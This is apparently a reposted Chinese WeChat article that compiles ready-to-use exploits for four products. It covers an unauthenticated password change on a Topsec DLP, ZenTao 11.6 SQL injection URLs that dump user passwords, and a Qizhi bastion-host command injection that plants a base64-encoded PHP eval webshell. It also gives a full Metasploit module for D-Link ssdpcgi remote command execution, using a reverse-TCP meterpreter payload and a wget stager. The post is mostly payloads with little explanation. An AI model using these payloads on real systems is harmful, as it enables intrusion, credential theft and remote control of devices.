> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/icgOpX8ofLIoO8nehsMarA)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yb8EPbHU4n74qm5EttNlia7ibLCbVLrh5l1e0NygtU0xGD7aMbwcfXXEtEs3PvwCDiaA4RRXiaKqICFw/640?wx_fmt=png)

**0x01 天融信 DLP 未授权 & 越权漏洞  
**

```
## 默认用户
superman --- uid=1
```

```
## Payload
POST /?module-auth_user&action=mod_edit.pwd HTTP/1.1
```

**0x02 禅道 11.6 SQL 注入漏洞**

最新版所采用的 pathinfo 模式，首先通过传参确定进入的 control 文件為 api，对应的 method 为 getModel，接着开始对参数进行赋值，其中 moduleName 为 api，methodName=sql，最后的 param 为 sql=select+account,password+from+zt_user，那么调用了 call_user_func_array 函数后，会进入到 api 目录下的 model 文件，对应调用其中的 sql 函数 ，并通过赋值，将 sql 变量赋值为 select+ account,password+from+zt_user，最后执行 query 语句。

```
## 漏洞地址
http://xxx.xxx/zentaopms_11.6/www/api-getModel-user-getRealNameAndEmails-users=admin
http://xxx.xxx/zentaopms_11.6/www/api-getModel-api-sql-sql=select+account,password+from+zt_user
```

**0x03 齐治堡垒机前台远程代码执行漏洞**

影响版本：ShtermClient-2.1.1

```
## 漏洞利用
1.访问https://xx.xx.xx.xx/listener/cluster/_manage.php
2.生成webshell
https://xx.xx.xx.xx/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUW3NoZWxsXSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9zaGVsbC5waHA="|base64${IFS}-d|bash`|${IFS}|echo${IFS}
```

**0x04 D-Link Devices 未经身份验证远程命令执行漏洞**

MSF EXP：

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi',
      'Description' => %q{
        D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi.
      },
      'Author'      =>
        [
          's1kr10s',
          'secenv'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2019-20215'],
          ['URL', 'https://medium.com/@s1kr10s/2e799acb8a73']
        ],
      'DisclosureDate' => 'Dec 24 2019',
      'Privileged'     => true,
      'Platform'       => 'linux',
      'Arch'        => ARCH_MIPSBE,
      'DefaultOptions' =>
        {
            'PAYLOAD' => 'linux/mipsbe/meterpreter_reverse_tcp',
            'CMDSTAGER::FLAVOR' => 'wget',
            'RPORT' => '1900'
        },
      'Targets'        =>
        [
          [ 'Auto',  { } ],
        ],
      'CmdStagerFlavor' => %w{ echo wget },
      'DefaultTarget'  => 0
      ))

  register_options(
    [
      Msf::OptEnum.new('VECTOR',[true, 'Header through which to exploit the vulnerability', 'URN', ['URN', 'UUID']])
    ])
  end

  def exploit
    execute_cmdstager(linemax: 1500)
  end

  def execute_command(cmd, opts)
    type = datastore['VECTOR']
    if type == "URN"
      print_status("Target Payload URN")
      val = "urn:device:1;`#{cmd}`"
    else
      print_status("Target Payload UUID")
      val = "uuid:`#{cmd}`"
    end

    connect_udp
    header = "M-SEARCH * HTTP/1.1\r\n"
    header << "Host:239.255.255.250: " + datastore['RPORT'].to_s + "\r\n"
    header << "ST:#{val}\r\n"
    header << "Man:\"ssdp:discover\"\r\n"
    header << "MX:2\r\n\r\n"
    udp_sock.put(header)
    disconnect_udp
  end
end
```

有点安静了... 有分享情报的吗![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yHqk6Ck13IlYIPQKxm0UI8Bf96EL6LiceN36ekplc860buTBib7qkt1BqBVapvqJUt4ibqSMHiciaFpug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/ccX15AUPS2yHqk6Ck13IlYIPQKxm0UI8FnnBibibdOgXFb6EKlsY7KROdTfxVicjfMS41byYHnFBpQCHxa2s1tfZQ/640?wx_fmt=jpeg)